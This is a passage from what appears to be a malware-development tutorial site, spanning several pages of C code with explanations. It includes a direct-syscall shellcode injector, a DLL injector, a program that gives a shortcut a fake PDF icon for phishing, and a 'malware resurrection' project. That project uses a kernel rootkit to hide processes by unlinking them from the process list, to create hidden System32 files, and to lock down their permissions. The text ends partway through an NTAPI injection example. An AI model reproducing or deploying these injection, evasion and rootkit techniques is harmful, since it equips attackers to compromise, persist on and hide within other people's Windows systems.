NtWriteVirtualMemorySSN = GetSSN(NTDLLAddress, \"NtWriteVirtualMemory\"); Status = My_NtWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, ShellcodeSize, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtWriteVirtualMemory failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtCreateThreadExSSN = GetSSN(NTDLLAddress, \"NtCreateThreadEx\"); Status = My_NtCreateThreadEx(\u0026HandleThread, THREAD_ALL_ACCESS, NULL, HandleProcess, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, FALSE, 0, 0, 0, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtCreateThreadEx failed! Error Code: 0x%lx\\n\", Status); return 1; } NtWaitForSingleObjectSSN = GetSSN(NTDLLAddress, \"NtWaitForSingleObject\"); Status = My_NtWaitForSingleObject(HandleThread, FALSE, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtWaitForSingleObject failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 1; } printf(\"Shellcode executed successfully\\n\"); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Here‚Äôs the result:\nConclusion In this documentation, we have seen how to make syscall directly from the user mode program. I hope the topic was useful for you"},"title":"Direct Syscalls"},"/docs/malware-dev/dll-injection/":{"data":{"":"","#":"Introduction In this documentation, we will discuss how to execute any shellcode via DLL Injection technique. The technique is a variation of the shellcode injection. It also can be used for debugging purpose rather than malware.\nWhat is DLL? Before the technique, we need to understand what‚Äôs a DLL actually.\nDLLs (Dynamic Link Library) are libraries containing code and data that are used by multiple programs at the same time. When you run a program on the Windows operating system or when the Windows operating system wants to perform a function, it uses DLLs.\nThese libraries usually contain code, functions or resources that are common to more than one application, as I mentioned above. This reduces code duplication and shrinks application sizes. DLLs are loaded into memory only when needed, which makes efficient use of system resources.\nCoding DLL I don‚Äôt want to leave the topic theoretically by just saying ‚ÄúThis is DLL‚Äù. In order to make it clearer in our minds what DLL is, we will create a DLL project in Visual Studio environment and simply code it. Then we will inject the DLL we have prepared with the DLL Injection method. Do not have any doubts in your mind with questions like ‚ÄúHow do we code for DLL?‚Äù. DLLs are coded in C/C++ languages, so our development will not be difficult.\nLet‚Äôs open Visual Studio and click on Create a new Project and search for ‚ÄòDynamic‚Äô in the search field:\nThen select it and create the project by naming it. After the project is created, the following codes will greet us:\nThe main field of DLLs is DllMain. Just like in C projects we write code to the main function, in DLL projects this is the starting point. But there is a difference here: The DllMain function takes a few special parameters and these parameters are used to manage the DLL‚Äôs life cycle.\nThe parameters of DllMain:\nhModule: This parameter is a handle to the module in which the DLL is loaded. This usually points to the DLL‚Äôs memory address and is unique throughout the process. ul_reason_for_call: This indicates the reason for calling the DLL. Keep this in mind especially because we will detail it. lpReserved: Used to carry additional information during loading and unloading. This parameter is usually rarely used. The switch-case structure in DLLMain works according to the ul_reason_for_call parameter. This parameter indicates which state the DLL is in. There are four different cases and let‚Äôs analyze them in order:\nDLL_PROCESS_ATTACH: This means that the DLL is loaded for the first time by a process. DLL_THREAD_ATTACH: This comes into play if a new thread is created within your program. For example, if you want to make thread-specific data or settings, you can write code in this case. DLL_THREAD_DETACH: This is called when a thread ends. You can use it to free private resources associated with the thread or to perform cleanup operations. DLL_PROCESS_DETACH: This happens when the DLL is no longer used or when the program is closed. In other words, whatever is needed before the program closes is done in this section. Finally, returning TRUE indicates that the DLL was successfully installed or running. If a problem occurred, we can return FALSE. But TRUE is usually the default option.\nThe case we will be interested in for our coding will be DLL_PROCESS_ATTACH. Now let‚Äôs do some simple coding here:\nThen, in Solution Explorer, right click on our project, select Rebuild and browse to the .dll created from the /x64/Debug directory.\nDLL Injection DLL Injection technique involves injecting a malicious DLL into a process. Think of it as injecting malicious shellcode just like we did in our previous documentation.\nWith the malicious DLL installed, you can now change the behavior of the Process according to whatever your goal is. Although it sounds like a technique used only for Malware Development, I would like to emphasize here that it is also used for debugging purposes.\nIf you remember, in our previous documentation, we were embedding the shellcode we had into the target process via memory. As I said, you can think of this method like this. We will embed the path to our DLL in the target process memory and then have the process run LoadLibraryW to load the malicious DLL.\nCoding #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e int main(int argc, char* argv[]) { DWORD PID = 0; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL; wchar_t DllPath[MAX_PATH] = L\"C:\\\\Users\\\\bekoo\\\\bekoo.dll\"; DWORD DllPathSize = sizeof(DllPath); if (argc \u003c 2) { printf(\"Usage: %s \u003cPID\u003e\\n\", argv[0]); return 1; } PID = atoi(argv[1]); printf(\"Injecting DLL into PID %d\\n\", PID); LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L\"kernel32.dll\"), \"LoadLibraryW\"); if (LoadLibraryAddress == NULL) { printf(\"Failed to get LoadLibraryW address\\n\"); return 1; } printf(\"LoadLibraryW address: 0x%p\\n\", LoadLibraryAddress); HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to open process\\n\"); return 1; } RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, DllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to allocate memory in remote process\\n\"); return 1; } if (!WriteProcessMemory(HandleProcess, RemoteBuffer, DllPath, DllPathSize, NULL)) { printf(\"Failed to write DLL path to remote process\\n\"); return 1; } HandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, LoadLibraryAddress, RemoteBuffer, 0, NULL, NULL); if (HandleThread == NULL) { printf(\"Failed to create remote thread\\n\"); return 1; } WaitForSingleObject(HandleThread, INFINITE); printf(\"DLL injected\\n\"); return 0; } If you have read my Shellcode Injection documentation, these codes will not look foreign to you. Because we are doing almost the same things except for a few things. In the previous topic we didn‚Äôt use things like LoadLibrary, so let‚Äôs take a look at that:\nLoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L\"kernel32.dll\"), \"LoadLibraryW\"); if (LoadLibraryAddress == NULL) { printf(\"Failed to get LoadLibraryW address\\n\"); return 1; } printf(\"LoadLibraryW address: 0x%p\\n\", LoadLibraryAddress); Here we get the address of the LoadLibraryW API from kernel32.dll with GetProcAddress and the address is passed to the LoadLibraryAddress variable.\nThen we do an if check. If GetProcAddress returns NULL, it means that the address of the function was not received and we close the program with an error message. ‚ÄúSo, where do we use this address?‚Äù may be a question, let me show you:\nHandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, LoadLibraryAddress, RemoteBuffer, 0, NULL, NULL); if (HandleThread == NULL) { printf(\"Failed to create remote thread\\n\"); return 1; } Notice that I have given this address to lpStartAddress, the fourth parameter of CreateRemoteThreadEx, and the allocated memory address as lpParameter. For our purposes here, the address given to the target Process is the address of the LoadLibraryW function we obtained. This function will load the DLL we have prepared using this function. We give the RemoteBuffer value as a parameter for the LoadLibraryW function.\nResult Here‚Äôs result of the project:\nAs we can see in the result, when we give the PID value of the paint application, it injects the DLL and we see our message.\nConclusion In this documentation, we saw the DLL Injection technique. This technique is really simple, and also can be useful in the several malware projects.\nThe idea of this technique is simple: Write a malicious DLL and embedded the path into the memory of the target process, then execute it with thread."},"title":"DLL Injection"},"/docs/malware-dev/file-icon-spoofing/":{"data":{"":"","#":"In this documentation, we will see Icon File Spoofing technique.\nWhat is Icon File Spoofing? To summarize the technique briefly, it involves changing the icon of the program to deceive the user. This allows the user to view the malware as a harmless file. The icon you choose for the malware can be a PDF, as shown in the example, or any other icon.\nTo better understand the topic, let‚Äôs proceed with an example scenario: imagine you are a pentester tasked with testing the security of a company‚Äôs internal network. You need to test how careful company employees are about opening malicious files. In this context, you can send your malicious software disguised as a harmless PDF file via a phishing email or by placing it in a shared folder. If an employee opens the file, it actually runs the malicious software and gains access to their systems.\nCoding Here‚Äôs code:\n#include \u003cstdio.h\u003e #include \u003cstrsafe.h\u003e #include \u003cwchar.h\u003e #include \u003cShlObj.h\u003e #include \u003cobjbase.h\u003e #include \u003cWindows.h\u003e BOOL CreateShortcut(const wchar_t* TargetPath, const wchar_t* ShortcutPath, const wchar_t* IconPath ) { HRESULT HRES; IShellLink* PSL = NULL; IPersistFile* PPF = NULL; CoInitialize(NULL); HRES = CoCreateInstance(\u0026CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, \u0026IID_IShellLink, (void**)\u0026PSL); if (FAILED(HRES)) { wprintf(L\"Failed to create IShellLink Object! Error Code: 0x%08X\\n\", HRES); return 1; } PSL-\u003elpVtbl-\u003eSetPath(PSL, TargetPath); PSL-\u003elpVtbl-\u003eSetIconLocation(PSL, IconPath, 0); PSL-\u003elpVtbl-\u003eSetDescription(PSL, L\"Very important file\"); HRES = PSL-\u003elpVtbl-\u003eQueryInterface(PSL, \u0026IID_IPersistFile, (void**)\u0026PPF); if (FAILED(HRES)) { wprintf(L\"Failed to interface! Error Code: 0x%08X\\n\", HRES); return 1; } HRES = PPF-\u003elpVtbl-\u003eSave(PPF, ShortcutPath, TRUE); PPF-\u003elpVtbl-\u003eRelease(PPF); PSL-\u003elpVtbl-\u003eRelease(PSL); CoUninitialize(); wprintf(L\"Shortcut Created!\\n\"); return 0; } int main() { wchar_t TargetPath[MAX_PATH] = L\"C:\\\\Windows\\\\System32\\\\calc.exe\"; wchar_t IconPath[MAX_PATH] = L\"C:\\\\path\\\\to\\\\pdficon.ico\"; wchar_t ShortcutPath[MAX_PATH]; HRESULT HRFolder; HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath); if (FAILED(HRFolder)) { wprintf(L\"Failed to get Desktop Path! Error Code: 0x%08X\\n\", HRFolder); return 1; } StringCchCatW(ShortcutPath, MAX_PATH, L\"\\\\Projects.lnk\"); wprintf(L\"Merged Path: %s\\n\", ShortcutPath); if (CreateShortcut(TargetPath, ShortcutPath, IconPath) \u003e 0) { wprintf(L\"Failed to create Shortcut!\\n\"); return -1; } return 0; } Let‚Äôs take a closer look at the code, starting with main:\nwchar_t TargetPath[MAX_PATH] = L\"C:\\\\Windows\\\\System32\\\\calc.exe\"; wchar_t IconPath[MAX_PATH] = L\"C:\\\\path\\\\to\\\\pdficon.ico\"; wchar_t ShortcutPath[MAX_PATH]; TargetPath: This variable specifies the path of the target file for the shortcut to be created. This variable specifies the path of our malware. IconPath: This variable specifies the path of the icon for the shortcut to be created. ShortcutPath: This variable specifies the path of the shortcut to be created. HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath); if (FAILED(HRFolder)) { wprintf(L\"Failed to get Desktop Path! Error Code: 0x%08X\\n\", HRFolder); return 1; } StringCchCatW(ShortcutPath, MAX_PATH, L\"\\\\Projects.lnk\"); wprintf(L\"Merged Path: %s\\n\", ShortcutPath); In this section, we first get the full path of the desktop directory with the SHGetFolderPath function. Then we combine the directory path with the shortcut name to be created via StringCchCatW. In this way, we get the full path of the shortcut to be created.\nI set this shortcut name as Projects.lnk, you can change it if you wish.\nif (CreateShortcut(TargetPath, ShortcutPath, IconPath) \u003e 0) { wprintf(L\"Failed to create Shortcut!\\n\"); return -1; } Here, we call the CreateShortcut function we created and make a comparison with if. If the CreateShortcut function returns a value higher than 0, i.e. 1, we print the error message on the screen and return the program with -1.\nCoInitialize(NULL); HRES = CoCreateInstance(\u0026CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, \u0026IID_IShellLink, (void**)\u0026PSL); if (FAILED(HRES)) { wprintf(L\"Failed to create IShellLink Object! Error Code: 0x%08X\\n\", HRES); return 1; } In the CreateShortcut function, we first initialize the COM components with the CoInitialize function. But why are we initializing COM components? Because IShellLink and IPersistFile interfaces are COM components. These interfaces are the tools we will use to create shortcuts. So we need to initialize the COM components to access them.\nThen we create the IShellLink interface with the CoCreateInstance function. If this fails, we return the program by printing an error message.\nPSL-\u003elpVtbl-\u003eSetPath(PSL, TargetPath); PSL-\u003elpVtbl-\u003eSetIconLocation(PSL, IconPath, 0); PSL-\u003elpVtbl-\u003eSetDescription(PSL, L\"Very important file\"); HRES = PSL-\u003elpVtbl-\u003eQueryInterface(PSL, \u0026IID_IPersistFile, (void**)\u0026PPF); if (FAILED(HRES)) { wprintf(L\"Failed to interface! Error Code: 0x%08X\\n\", HRES); return 1; } In this code block, we add Target Path, Icon Path and Description to the IShellLink interface we created. These steps specify the properties of the shortcut we will create. Then we access the IPersistFile interface with the QueryInterface function.\nHRES = PPF-\u003elpVtbl-\u003eSave(PPF, ShortcutPath, TRUE); PPF-\u003elpVtbl-\u003eRelease(PPF); PSL-\u003elpVtbl-\u003eRelease(PSL); CoUninitialize(); wprintf(L\"Shortcut Created!\\n\"); Finally, we save the shortcut we created with the Save function to the full path we created in main. Then we release the IPersistFile and IShellLink interfaces. We terminate the COM components with the CoUninitialize function.\nRunning the Program When we run the program, our shortcut will appear on the desktop as follows:\nThe shortcut actually looks like a pdf, but when we take a look at its properties, it will actually run a different program:\nConclusion This method is often employed in phishing attacks and penetration testing to evaluate user awareness and the effectiveness of security policies within an organization. By understanding how to create such spoofed shortcuts, security professionals can better prepare defenses against these social engineering tactics.\nThe provided example demonstrates how to programmatically create a shortcut with a spoofed icon using Windows COM interfaces. It shows the practical implementation of the technique and highlights the risks of trusting only visual cues like file icons.\nReferences S12 H4CK - PDF Icon File Spoofing "},"title":"PDF Icon File Spoofing"},"/docs/malware-dev/malware-resurrection/":{"data":{"":"","#":"Introduction In this blog, we will discuss of the malware resurrection technique.\nWhat is Malware Resurrection Malware Resurrection is a persistence and self-recovery technique used by certain malicious programs to ensure they remain active on an infected system, even after being terminated. This technique allows the malware to automatically relaunch or reinfect the host if it is closed by the user, killed by security software, or crashes due to an error.\nIn other words, the malware ‚Äúwatches over‚Äù itself or has a companion process that monitors its execution state and immediately restarts it if it is no longer running.\nThe Project In my project, I developed a rootkit and a user-mode program to implement malware resurrection, leveraging the advantages of both modes. The user-mode program continuously monitors the malware process, and if the malware is terminated, it immediately triggers the resurrection procedure to restart it. The rootkit strengthens the process of resurrection via DKOM attacks etc.\nWe can go through the diagram:\nListening the Malware from User Mode Program Firstly the user mode program listens the process with IsProcessRunning function of the project:\nBOOLEAN IsProcessRunning(DWORD ProcessID) { HANDLE HandleProcessSnap = NULL; PROCESSENTRY32 PE32; BOOL Status = FALSE; HandleProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == HandleProcessSnap) { return FALSE; } PE32.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(HandleProcessSnap, \u0026PE32)) { CloseHandle(HandleProcessSnap); return FALSE; } do { if (PE32.th32ProcessID == ProcessID) { Status = TRUE; break; } } while (Process32Next(HandleProcessSnap, \u0026PE32)); CloseHandle(HandleProcessSnap); return Status; } The idea is simple: it gets the snapshot of all running processes, then iterates through them one by one using Process32First and Process32Next. For each process in the snapshot, it compares its th32ProcessID with the target ProcessID. If a match is found, it sets Status to TRUE and breaks out of the loop. If no match is found after going through all processes, Status remains FALSE. Finally, the function closes the snapshot handle and returns whether the process was found.\nIf the function return FALSE, then the program continues by creating a hidden folder.\nCreating Hidden Folder Here, the first step is that the program connects with rootkit then, the rootkit creates a hidden file in System32. This section of the rootkit is really simple. From CreateHiddenFile function:\nNTSTATUS CreateHiddenFile() { HANDLE HandleDirectory = NULL; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status; InitializeObjectAttributes(\u0026ObjAttr, \u0026G_ExecutablePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); Status = ZwCreateFile(\u0026HandleDirectory, GENERIC_ALL, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_HIDDEN, \\ FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { return Status; } ZwClose(HandleDirectory); return STATUS_SUCCESS; } It just initializes Object Attributes, then calls ZwCreateFile the hidden file.\nCreate a Process After the file is created, the user mode program creates a process with NtCreateUserProcess. To be honest i didn‚Äôt this in the rootkit.\nWhen I first started developing this project, I tried to find and create ZwCreateProcess in the kernel-mode driver and tried many other methods, but unfortunately none of them worked for me. Later I found out that APIs like ZwCreateProcessEx are used to create kernel-level processes, and I tried other methods like NtCreateUserProcess, which Microwave90 user has implemented in his kernel-based driver project, but to no avail.\nLater in my research, I found Capt. Meelo‚Äôs blog about running NtCreateUserProcess in a user-mode application and frankly the code was very useful for me and I decided to add process creation to my user-mode program. Here‚Äôre codes:\nNTSTATUS CreateTargetProcess(UNICODE_STRING ImagePath, PHANDLE HandlePtr) { PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL; PPS_ATTRIBUTE_LIST AttrList; PS_CREATE_INFO CreateInfo = { 0 }; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; NTSTATUS Status; Status = RtlCreateProcessParametersEx(\u0026ProcessParameters, \u0026ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, \\ RTL_USER_PROCESS_PARAMETERS_NORMALIZED); if (!NT_SUCCESS(Status)) { return Status; } CreateInfo.Size = sizeof(CreateInfo); CreateInfo.State = PsCreateInitialState; AttrList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)); AttrList-\u003eTotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE); AttrList-\u003eAttributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME; AttrList-\u003eAttributes[0].Size = ImagePath.Length; AttrList-\u003eAttributes[0].Value = (ULONG_PTR)ImagePath.Buffer; Status = NtCreateUserProcess(\u0026HandleProcess, \u0026HandleThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, \\ \u0026CreateInfo, AttrList); if (!NT_SUCCESS(Status)) { RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return Status; } *HandlePtr = HandleProcess; RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return STATUS_SUCCESS; } When we call CreateProcess from user mode, these steps will be processed:\nFirst, CreateProcessInternal is called from kernel32, then NtCreateUserProcess from ntdll.dll and finally NtCreateUserProcess from ntoskrnl.exe by entering kernel-mode. The reason for using NtCreateUserProcess here is that Capt. Meelo mentioned in the article, it is the lowest level API that can be used to evade AV/EDR detection checks.\nBut if you notice, we don‚Äôt call NtCreateUserProcess directly in the code. Before that we need to complete some steps and then call NtCreateUserProcess. Because Windows expects some parameters to be specified when creating a process. These parameters are RTL_USER_PROCESS_PARAMETERS and PS_ATTRIBUTE_LIST.\nRemove the Malware from the Process List After the process is created, the rootkit will remove the process from the process list. For this, it will use the technique of DKOM Attack:\nULONG GetActiveProcessLinkOffset() { ULONG MajorVersion = 0; ULONG MinorVersion = 0; ULONG BuildNumber = 0; NTSTATUS Status; Status = GetWindowsVersion(\u0026MajorVersion, \u0026MinorVersion, \u0026BuildNumber); if (!NT_SUCCESS(Status)) { return 0; } /* Note that these offset value (For 0x448) may change with future updates. */ if (10 == MajorVersion \u0026\u0026 22000 \u003e= BuildNumber) { /* The offset value 0x448 has been tested in Windows 10 and Windows 11. If the offset value 0x448 fails in the windows version you tried, you can find and change the offset of ActiveProcessLink with windbg. */ return 0x448; // For Win 10 and Win 11 } else if (10 == MajorVersion) { return 0x448; // For Win 10 and Win 11 } else if (6 == MajorVersion \u0026\u0026 3 == MinorVersion) { return 0x2e8; // For Win 8 } else if (6 == MajorVersion \u0026\u0026 1 == MinorVersion) { return 0x118; // For Win 7 } return 0; } NTSTATUS HideProcess(HANDLE ProcessID) { PLIST_ENTRY ActiveProcessLink; PEPROCESS Process; ULONG Offset; NTSTATUS Status; Status = PsLookupProcessByProcessId(ProcessID, \u0026Process); if (!NT_SUCCESS(Status)) { return Status; } Offset = GetActiveProcessLinkOffset(); if (0 == Offset) { return STATUS_NOT_SUPPORTED; } ActiveProcessLink = (PLIST_ENTRY)((PUCHAR)Process + Offset); RemoveEntryList(ActiveProcessLink); return STATUS_SUCCESS; } The Active Process List is organized as a doubly linked list. In this structure, each record (or node) stores two pointers: one to the previous node and one to the next node in the list. These pointers connect all the nodes together, allowing traversal in both directions.\nIn the Windows kernel, the equivalent of a doubly-linked list is represented by the LIST_ENTRY data structure, defined as follows:\nkd\u003e dt _list_entry ntdll!_LIST_ENTRY +0x000 Flink : Ptr64 _LIST_ENTRY +0x008 Blink : Ptr64 _LIST_ENTRY Here, Flink (forward link) and Blink (backward link) correspond to the Next and Previous pointers in a standard doubly-linked list, pointing to the next and previous elements in the list.\nIn the project, using this offset, the process is looked up by its ProcessID, and its entry is removed from the linked list by updating the Flink and Blink pointers, effectively hiding the process from system views.\nThe following code snippet demonstrates how a rootkit can hide a process by removing its ActiveProcessLink entry from the list. First, the code calculates the offset of the ActiveProcessLink within the process structure based on the Windows version, since these offsets can vary between versions:\nULONG GetActiveProcessLinkOffset() { ULONG MajorVersion = 0, MinorVersion = 0, BuildNumber = 0; NTSTATUS Status = GetWindowsVersion(\u0026MajorVersion, \u0026MinorVersion, \u0026BuildNumber); if (!NT_SUCCESS(Status)) return 0; if (MajorVersion == 10 \u0026\u0026 BuildNumber \u003c= 22000) { return 0x448; // Windows 10 / 11 tested offset } else if (MajorVersion == 6 \u0026\u0026 MinorVersion == 3) { return 0x2e8; // Windows 8 } else if (MajorVersion == 6 \u0026\u0026 MinorVersion == 1) { return 0x118; // Windows 7 } return 0; } Then it removes the process from the process list.\nManipulating the Permissions of the Hidden File Well, it is crucial to control its permissions to prevent unauthorized access or deletion. Manipulating the file‚Äôs permissions involves adjusting its Access Control Lists (ACLs) to restrict or allow specific actions by users or processes.\nIn Windows, file permissions are managed through Security Descriptors that contain Discretionary Access Control Lists (DACLs). By modifying the DACL, you can:\nDeny read, write, or delete access to standard users.\nAllow only trusted system processes or administrators to interact with the hidden file.\nPrevent accidental or malicious removal of the file.\nThe rootkit will make the hidden file and executable file undeletable and unexecutable. This permission change will affect both admin and normal users.\nConclusion In this blog, we explored the concept of malware resurrection‚Äîa technique that allows malicious software to persist by automatically restarting itself if terminated. We walked through a project combining user-mode monitoring and kernel-mode rootkit methods, including process hiding via DKOM and securing hidden files. This layered approach makes malware more resilient and harder to detect, highlighting the ongoing challenges in cybersecurity defense."},"title":"Malware Resurrection"},"/docs/malware-dev/ntapi-injection/":{"data":{"":"","#":"In this documentation, we will explore NTAPI Injection.\nUser Mode and Kernel Mode Before we get into the technique, we need to understand some basic things and let‚Äôs take a look at what are User-Mode and Kernel-Mode.\nThe Windows operating system basically offers two different rings: user mode and kernel mode. This distinction is based on the security of the operating system, the organization of its operation and the efficient use of resources. Both fields play different roles and complement each other.\nUser Mode (Ring 3) User mode is an field reserved for applications and processes running in the operating system. Processes running in this mode do not have direct access to system resources and hardware. Instead, they make calls to kernel components of the operating system that run in kernel mode. These calls are usually made through WinAPI and, at a lower level, NTAPI, which is our main topic. Other features of the user mode:\nIt provides a secure field where user applications run. In case of a crash, it only affects the application in question, not the whole system. It needs to switch to kernel mode for hardware access. Kernel Mode (Ring 0) Kernel mode is where the kernel of the operating system and the components that communicate directly with the hardware run. Drivers running in this mode have full control over the system, meaning they have more privileges and power than in user-mode. However, with this power comes great responsibility: Errors in kernel mode can affect the entire system and cause it to crash. Other features of kernel mode space:\nDirect access to hardware and system resources. It is a less isolated environment in terms of security measures and fault tolerance. It is the level where NTAPI calls are processed and executed. What is Native API? If you have followed my previous DLL Injection and Shellcode Execution documentations, you can remember that in these techniques we usually use WinAPI functions to execute our code. However, WinAPI represents a more user-friendly layer of the Windows operating system and is based on NTAPI (Native API).\nNTAPI is a lightweight, low-level programming interface used by both kernel mode and user mode applications of Windows. The background operation of WinAPI relies heavily on NTAPI. For example, many subroutines that perform WinAPI functions use NTAPI calls through libraries such as kernel32.dll.\nLet‚Äôs create a scenario to get a better picture. Let‚Äôs say we call OpenProcess from the user mode program. The operations shown in the diagram below will take place:\nWhen we take a look at our diagram, we see that the OpenProcess API called by the User mode program is first directed to the kernel32.dll library and now when it is directed to the ntdll.dll library, which is the last stop of this mode, it turns into NtOpenProcess. ntdll.dll library is the last stop for the user-mode field and the next flow will continue in the kernel field.\nI don‚Äôt want to confuse you too much by explaining SSDT here because it is a bit advanced and confusing. However, you can think of it as follows to keep it in your head: SSDT (System Service Descriptor Table) acts as a bridge to direct system calls from user mode to the correct APIs in kernel mode. This table takes the called Native APIs and redirects them to the corresponding addresses in ntoskrnl.exe in kernel mode. If you want to know more about SSDT, you can check my documentation about SSDT.\nAfter the SSDT table, we can see that the operations are completed by redirecting to the address of NtOpenProcess in ntoskrnl.exe.\nIt is also possible to see this live. Let‚Äôs create a project in Visual Studio where we just call OpenProcess and then analyze it in Windbg to see what it turns out:\nWhen we put a breakpoint on ntdll.dll, which is the last stop in the user-mode field, and run the program, we can see that KERNELBASE!OpenProcess is called first and then ntdll!NtOpenProcess is called. After ntdll.dll, the flow will continue in the kernel.\nWhat is NTAPI Injection? The NTAPI Injection technique involves directly interacting with the Windows Native API provided by ntdll.dll. This means that a malware that exploits this technique uses lower levels of ntdll.dll instead of higher level Windows APIs. For example, the malware does not call OpenProcess, but directly calls the lower level NtOpenProcess.\nLet‚Äôs do some simple coding to understand the technique more closely. Let‚Äôs see how to call an NTAPI directly from ntdll.dll from the user-mode program. Our example will be NtOpenProcess.\nFirst of all, we need to prepare before coding. Since we will directly call lower level APIs and they are not defined for user-mode fields, we will need to define them ourselves and then call them by getting their address.\nWe can use sites like NtDoc, which I often use, to create the relevant NTAPI:\nWe can access the structure by searching for the NTAPI you want to use in your project. Since our goal is to call NtOpenProcess in the project, let‚Äôs search for it:\nAs we can see the NtOpenProcess API takes four parameters:\nNTSYSCALLAPI NTSTATUS NTAPI NtOpenProcess( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ PCOBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId ); If you remember, the OpenProcess function takes three parameters while its sub-level NtOpenProcess takes four. It also has two different parameters compared to OpenProcess.\nNow let‚Äôs add this structure to our project:\nWhen we add the structure to our project, you will see that it gives an error for the last two structures. Since these are not defined for the usermode field, we will need to define these structures from sites like ntdoc. We can add the structures by searching for CLIENT_ID and OBJECT_ATTRIBUTES on the site:\nAfter these two structures, define the other structures that you get errors by searching from the site.\nFinally, we will need to define NTSTATUS before we start coding. Since the return address of NTAPIs is of the type we call NTSTATUS, we will also define it and see if it is successful according to NTSTATUS values:\ntypedef _Return_type_success_(return \u003e= 0) long NTSTATUS; Let‚Äôs add this to our project. Now we can move on to coding:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef const UNICODE_STRING* PCUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PCUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR; PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef NTSTATUS(NTAPI* NtOpenProcess)( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId ); int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Kullanim: program.exe \u003cPID\u003e\\n\"); return -1; } DWORD PID = atoi(argv[1]); HMODULE NTDLL = GetModuleHandleW(L\"ntdll.dll\"); if (NTDLL == NULL) { printf(\"NTDLL'in adresi alinamadi!\\n\"); return -1; } printf(\"NTDLL adresi: 0x%p\\n\", NTDLL); NtOpenProcess NtOpenProcessAddress = (NtOpenProcess)GetProcAddress(NTDLL, \"NtOpenProcess\"); if (NtOpenProcessAddress == NULL) { printf(\"NtOpenProcess adresi alinamadi!\\n\"); return -1; } printf(\"NtOpenProcess adresi: 0x%p\\n\", NtOpenProcessAddress); HANDLE HandleProcess = NULL; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != 0) { printf(\"NtOpenProcess fonksiyonu basarisiz oldu! Status: 0x%08x\\n\", Status); return -1; } printf(\"NtOpenProcess fonksiyonu basarili!\\n\"); return 0; } Let‚Äôs take a detailed look:\nHMODULE NTDLL = GetModuleHandleW(L\"ntdll.dll\"); if (NTDLL == NULL) { printf(\"NTDLL'in adresi alinamadi!\\n\"); return -1; } printf(\"NTDLL adresi: 0x%p\\n\", NTDLL); In main, we first start by getting the address of ntdll.dll. After getting the address of ntdll, we will reach the address of NtOpenProcess from this library.\nNtOpenProcess NtOpenProcessAddress = 